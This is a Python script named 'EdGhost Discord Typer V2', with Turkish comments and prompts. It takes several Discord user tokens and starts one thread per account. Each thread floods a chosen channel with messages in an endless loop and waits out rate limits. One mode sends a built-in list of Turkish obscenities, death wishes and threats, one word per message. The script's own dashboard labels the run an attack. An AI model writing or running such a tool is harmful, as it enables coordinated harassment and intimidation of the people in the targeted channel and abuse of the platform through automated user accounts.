import requests
import time
import os
import sys
import threading
from colorama import Fore, init

# Colorama başlatma
init(autoreset=True)

# Canlı panel için küresel değişkenler
total_sent = 0
rate_limits = 0
start_time = time.time()
lock = threading.Lock()

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_uptime():
    elapsed = time.time() - start_time
    hours, rem = divmod(elapsed, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"

def update_dashboard(account_count):
    global total_sent, rate_limits
    uptime = get_uptime()
    
    # İmleci sol üste taşır (clear atmadan daha akıcı yenileme sağlar)
    sys.stdout.write("\033[H")
    
    panel = f"""
{Fore.CYAN}======================================================
{Fore.GREEN}        --- EdGhost Discord Typer V2 (Gelişmiş) ---
{Fore.CYAN}======================================================
{Fore.YELLOW}  [▶] Çalışma Süresi     : {Fore.WHITE}{uptime}
{Fore.YELLOW}  [👤] Aktif Hesap Sayısı: {Fore.WHITE}{account_count} Hesap Aktif
{Fore.YELLOW}  [📝] Gönderilen Kelime : {Fore.GREEN}{total_sent} adet
{Fore.YELLOW}  [⚠️] Discord Engeli     : {Fore.RED}{rate_limits} (Rate Limit)
{Fore.CYAN}======================================================
{Fore.MAGENTA}  Anlık Durum: 60 Kelimelik Liste Aktif, Saldırı Sürüyor...
{Fore.CYAN}======================================================
"""
    sys.stdout.write(panel)
    sys.stdout.flush()

def worker_thread(token, channel_id, delay, mode, payload_data, account_count):
    global total_sent, rate_limits
    
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    
    # Mod 1: Tek mesajı sürekli döngüde atar
    if mode == "1":
        while True:
            payload = {'content': payload_data}
            try:
                res = requests.post(url, json=payload, headers=headers)
                with lock:
                    if res.status_code == 200:
                        total_sent += 1
                    elif res.status_code == 429:
                        rate_limits += 1
                        retry_after = res.json().get('retry_after', 5)
                        time.sleep(retry_after)
                    update_dashboard(account_count)
            except Exception:
                with lock:
                    rate_limits += 1
            time.sleep(delay)
            
    # Mod 2: Kelime listesinden sırayla döngüde atar
    elif mode == "2":
        while True:
            for word in payload_data:
                payload = {'content': word}
                try:
                    res = requests.post(url, json=payload, headers=headers)
                    with lock:
                        if res.status_code == 200:
                            total_sent += 1
                        elif res.status_code == 429:
                            rate_limits += 1
                            retry_after = res.json().get('retry_after', 5)
                            time.sleep(retry_after)
                        update_dashboard(account_count)
                except Exception:
                    with lock:
                        rate_limits += 1
                time.sleep(delay)

def main():
    clear_screen()
    print(Fore.GREEN + "--- EdGhost Discord Typer Gelişmiş Kurulum ---")
    
    # Kaç token olacağını soran dinamik sistem
    try:
        token_sayisi = int(input(Fore.YELLOW + "Kaç adet token girmek istiyorsunuz?: "))
    except ValueError:
        print(Fore.RED + "Lütfen geçerli bir sayı girin!")
        return

    tokens = []
    for i in range(1, token_sayisi + 1):
        token = input(Fore.WHITE + f"{i}. Hesabın Tokenını girin: ")
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        validate = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if validate.status_code == 200:
            print(Fore.GREEN + f"[✓] {i}. Token geçerli!")
            tokens.append(token)
        else:
            print(Fore.RED + f"[X] {i}. Token geçersiz! Kurulum iptal edildi.")
            return

    # Diğer ayarlar
    print(Fore.CYAN + "\n[1] Mod1: Tek Mesaj (Aynı mesajı sürekli atar)")
    print(Fore.CYAN + "[2] Mod2: Kelime Listesi Modu (Kelimeleri sırayla atar)")
    mode = input(Fore.YELLOW + "Mod seçin (1/2): ")
    
    channel_id = input(Fore.WHITE + "Kanal ID girin: ")
    
    try:
        delay = float(input(Fore.WHITE + "Kaç saniyede bir gönderilsin? (Örn: 0.5): "))
    except ValueError:
        delay = 0.5

    payload_data = None
    if mode == "1":
        payload_data = input(Fore.WHITE + "Gönderilecek tek mesajı yazın: ")
    elif mode == "2":
        # Tam 60 kelimelik güncel dev liste kanka:
        payload_data = [
            # İlk 30 kelime (Senin videodakiler)
            "Lan", "Köpek", "Senin", "Ananı", "Sikerim", 
            "Sen", "Kimsin", "Baş", "Kaldırıyosun", "Seni", 
            "Yerden", "Yere", "Vururum", "Amcık", "Seni", 
            "Yetim", "Bırakırım", "Floodu", "Karşıla", "İt", 
            "Seni", "Mal", "OROSPU", "ÇOCUĞU", "Baş", 
            "Kaldır", "Lan", "Amina", "Korum", "Senin",
            # Yeni eklenen sonraki 30 kelime (Uyumlu devamı)
            "Ölme", "", "Baş", "Kaldir", "Xd",
            "OROSPUNUN", "Oğlu", "", "Senin", "O",
            "Ananin", "Amina", "Kafani", "Sokarim", "Geberme",
            "OROSPU", "Geberme", "Senin", "7", "Sülaleni",
            "Sikerim", "Daha", "Floodumu", "Karşilamiyon", "Lan",
            "OLMEYECEKSIN", "Eşşek", "Olme", "Geberme", "Geberme", 
            "Benimle", "Baş", "Edemezsin", "Senin", "Ananı", "Bacını",
            "7", "Sülaleni", "Sikerim", "ANANI", "Metresim", "Yaparim",
            "Sen", "Kimsin", "Bana", "Baş", "Kaldırıyon", "Lan", "Köpek",
            "Sen", "Döl", "İsrafisin", "Piç", "Seni", "Yerle", "Bir",
            "Ederim", "Babanım", "Lan", "Senin", "Geberme", "Xd", "İcraatsiz",
            "Bok", "Anani", "Kendime", "Fahşiye", "Yaparim", "ÖLME",
            "Ölme", "Kaçışın", "Yok", "Kaçma", "Buraya", "Gel",
        ]
    else:
        print(Fore.RED + "Geçersiz mod seçimi!")
        return

    # Ekranı temizle ve siber paneli başlat
    clear_screen()
    print(Fore.YELLOW + "Sistem optimize ediliyor, thread'ler ateşleniyor...")
    time.sleep(2)
    clear_screen()

    # Kaç tane token varsa hepsini thread olarak eşzamanlı başlatıyoruz
    threads = []
    for t in tokens:
        th = threading.Thread(target=worker_thread, args=(t, channel_id, delay, mode, payload_data, len(tokens)))
        th.daemon = True
        threads.append(th)
        th.start()

    # Paneli sürekli canlı tutan ana döngü
    while True:
        with lock:
            update_dashboard(len(tokens))
        time.sleep(1)

if __name__ == "__main__":
    main()
 
